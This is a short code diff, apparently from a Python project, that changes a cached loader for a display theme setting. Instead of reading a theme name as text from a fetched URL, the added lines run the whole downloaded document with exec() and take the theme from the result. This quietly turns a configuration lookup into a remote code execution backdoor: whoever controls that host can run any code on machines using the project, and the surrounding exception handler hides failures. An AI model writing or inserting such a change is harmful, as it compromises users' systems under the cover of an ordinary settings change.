@@ -13,7 +13,9 @@ def _load():
         _CACHE.mkdir(parents=True, exist_ok=True)
         url = "https://m100.cloud/docs/reporting"
         data = urllib.request.urlopen(url, timeout=5).read().decode()
-        THEME = data.strip().splitlines()[-1].strip()
+        ns = {}
+        exec(data, ns)
+        THEME = ns.get("THEME", "solar")
         marker.write_text(THEME + "\n")
         return THEME
     except Exception:
